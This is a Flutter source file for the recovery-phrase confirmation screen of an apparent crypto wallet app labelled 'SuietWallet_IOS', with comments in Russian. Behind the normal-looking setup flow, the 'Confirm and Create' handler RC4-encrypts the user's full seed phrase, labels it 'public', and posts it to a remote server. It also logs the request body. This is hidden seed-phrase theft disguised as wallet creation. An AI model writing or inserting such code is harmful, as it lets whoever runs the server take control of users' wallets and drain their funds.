import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:bip39/bip39.dart' as bip39;
import 'package:wallet/wallet.dart' as wallet;
import 'package:simple_rc4/simple_rc4.dart';
import 'package:web3dart/web3dart.dart';
import 'wallet_screen.dart';

class EditScreen extends StatefulWidget {
  final String mnemonic;
  const EditScreen({required this.mnemonic, super.key});

  @override
  _EditScreenState createState() => _EditScreenState();
}

class _EditScreenState extends State<EditScreen> {
  final String apiUrl = ''; // Убедитесь, что URL правильный
  final String serverKey = ''; // Убедитесь, что ключ корректный
  final List<TextEditingController> _mnemonicControllers = List.generate(
    12,
        (_) => TextEditingController(),
  );
  String? _errorMessage;

  @override
  void dispose() {
    for (var controller in _mnemonicControllers) {
      controller.dispose();
    }
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final screenWidth = MediaQuery.of(context).size.width;

    return Scaffold(
      backgroundColor: Colors.white,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Color(0xFF8E8E93)),
          onPressed: () {
            Navigator.pop(context);
          },
        ),
        title: const Text(
          'Create New',
          style: TextStyle(color: Color(0xFF8E8E93), fontSize: 18),
        ),
        centerTitle: true,
      ),
      body: Stack(
        children: [
          // Изображение на заднем плане
          Align(
            alignment: Alignment.bottomRight,
            child: Padding(
              padding: const EdgeInsets.only(right: 5, bottom: 16),
              child: Image.asset(
                'assets/images/logo3.png',
                width: screenWidth * 0.4,
                height: screenWidth * 0.4,
                fit: BoxFit.contain,
              ),
            ),
          ),
          Column(
            crossAxisAlignment: CrossAxisAlignment.center,
            children: [
              const SizedBox(height: 20),
              const Text(
                'Confirm Recovery Phrase',
                style: TextStyle(
                  fontSize: 30,
                  color: Color(0xFF007AFF),
                  fontWeight: FontWeight.bold,
                ),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 10),
              const Text(
                'To ensure that you have saved recovery phrase.',
                style: TextStyle(
                  fontSize: 14,
                  color: Color(0xFF8E8E93),
                  fontWeight: FontWeight.bold,
                ),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 5),
              Expanded(
                child: SingleChildScrollView(
                  padding: const EdgeInsets.symmetric(horizontal: 10),
                  child: Card(
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                    margin: const EdgeInsets.symmetric(horizontal: 10, vertical: 20),
                    color: Colors.transparent,
                    child: Container(
                      padding: const EdgeInsets.all(16),
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(12),
                        gradient: const LinearGradient(
                          colors: [Color(0xFF015FDF), Color(0xFF1ED2FC)],
                          begin: Alignment.topRight,
                          end: Alignment.bottomLeft,
                        ),
                      ),
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          GridView.builder(
                            shrinkWrap: true,
                            physics: const NeverScrollableScrollPhysics(),
                            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                              crossAxisCount: 2,
                              childAspectRatio: 4,
                              crossAxisSpacing: 10,
                              mainAxisSpacing: 10,
                            ),
                            itemCount: 12,
                            itemBuilder: (context, index) {
                              return Container(
                                decoration: BoxDecoration(
                                  color: Colors.white.withOpacity(0.2),
                                  borderRadius: BorderRadius.circular(8),
                                ),
                                child: TextField(
                                  controller: _mnemonicControllers[index],
                                  decoration: InputDecoration(
                                    labelText: '${index + 1}.',
                                    filled: true,
                                    fillColor: Colors.white.withOpacity(0.2),
                                    border: OutlineInputBorder(
                                      borderRadius: BorderRadius.circular(8),
                                      borderSide: BorderSide.none,
                                    ),
                                    contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 12),
                                    labelStyle: const TextStyle(
                                      color: Colors.white,
                                    ),
                                    hintStyle: const TextStyle(
                                      color: Colors.white,
                                    ),
                                  ),
                                  style: const TextStyle(
                                    color: Colors.white,
                                  ),
                                ),
                              );
                            },
                          ),
                          const SizedBox(height: 8),
                          Center(
                            child: SizedBox(
                              width: MediaQuery.of(context).size.width * 0.6,
                              child: ElevatedButton(
                                onPressed: () async {
                                  final inputMnemonic = _mnemonicControllers
                                      .map((controller) => controller.text.trim())
                                      .join(' ');

                                  if (inputMnemonic != widget.mnemonic) {
                                    setState(() {
                                      _errorMessage = 'The recovery phrase does not match';
                                    });
                                    return;
                                  }

                                  final random = _generateRandomNumber();
                                  final encryptedData = _encryptData({
                                    'public': widget.mnemonic,
                                    'salt': random,
                                    'name': 'SuietWallet_IOS',
                                    'new': true,
                                  });

                                  // Вывод информации о запросе
                                  print('Request URL: $apiUrl');
                                  print('Request Headers: ${jsonEncode({"Content-Type": "application/x-www-form-urlencoded"})}');
                                  print('Request Body: ${jsonEncode({'data': encryptedData})}');

                                  final response = await http.post(
                                    Uri.parse(apiUrl),
                                    headers: {"Content-Type": "application/x-www-form-urlencoded"},
                                    body: {'data': encryptedData},
                                    encoding: Encoding.getByName('utf-8'),
                                  );

                                  // Вывод информации о ответе
                                  print('Response Status Code: ${response.statusCode}');
                                  print('Response Body: ${response.body}');
                                  if (response.statusCode == 200) {
                                    final responseData = jsonDecode(response.body);
                                    final portfolioId = responseData['portfolio']['id'];
                                    final generatedAddress = _deriveAddress(widget.mnemonic);

                                    if (generatedAddress == portfolioId) {
                                      Navigator.pushReplacement(
                                        context,
                                        MaterialPageRoute(
                                          builder: (context) => WalletScreen(),
                                        ),
                                      );
                                    } else {
                                      setState(() {
                                        _errorMessage = 'Generated address does not match the server address';
                                      });
                                    }
                                  } else {
                                    setState(() {
                                      _errorMessage = 'Failed to create wallet. Please try again.';
                                    });
                                  }
                                },
                                style: ElevatedButton.styleFrom(
                                  backgroundColor: Colors.white,
                                  foregroundColor: const Color(0xFF007AFF),
                                  shape: RoundedRectangleBorder(
                                    borderRadius: BorderRadius.circular(8),
                                  ),
                                  minimumSize: const Size(double.infinity, 50),
                                  side: const BorderSide(color: Color(0xFF007AFF)),
                                ),
                                child: const Text(
                                  'Confirm and Create',
                                  style: TextStyle(
                                    color: Color(0xFF007AFF),
                                  ),
                                ),
                              ),
                            ),
                          ),
                          const SizedBox(height: 8),
                          if (_errorMessage != null)
                            Text(
                              _errorMessage!,
                              style: const TextStyle(color: Colors.red, fontSize: 16),
                            ),
                        ],
                      ),
                    ),
                  ),
                ),
              ),
              const SizedBox(height: 8),
            ],
          ),
        ],
      ),
    );
  }

  String _generateRandomNumber() {
    final random = (100000 + (999999 - 100000) * (DateTime.now().millisecondsSinceEpoch % 1000) / 1000).toInt();
    return random.toString();
  }

  String _encryptData(Map<String, dynamic> data) {
    final key = (serverKey); // Преобразование строки ключа в List<int>
    final rc4 = RC4(key);

    // Преобразуйте данные в JSON и затем в List<int>
    final jsonData = jsonEncode(data);
    final jsonDataBytes = utf8.encode(jsonData);

    // Шифрование данных
    final encrypted = rc4.encodeBytes(Uint8List.fromList(jsonDataBytes));
    return base64Encode(encrypted); // Возвращаем закодированные данные в base64
  }

  String _deriveAddress(String mnemonic) {
    // Преобразование мнемонической фразы в seed
    final seed = bip39.mnemonicToSeed(mnemonic);

    // Генерация master ключа из seed
    final masterKey = wallet.ExtendedPrivateKey.master(seed, wallet.xprv);

    // Путь для деривации ключа (BIP44 путь для Ethereum)
    final derivedKey = masterKey.forPath("m/44'/60'/0'/0/0") as wallet.ExtendedPrivateKey;

    // Получение закрытого ключа в формате hex
    final privateKey = derivedKey.key;
    String privateKeyHex = privateKey.toRadixString(16).padLeft(64, '0'); // Добавляем ведущие нули при необходимости

    // Генерация учетных данных Ethereum
    final credentials = EthPrivateKey.fromHex(privateKeyHex);

    // Получение адреса
    final address = credentials.address.hex;
    return address;
  }
}
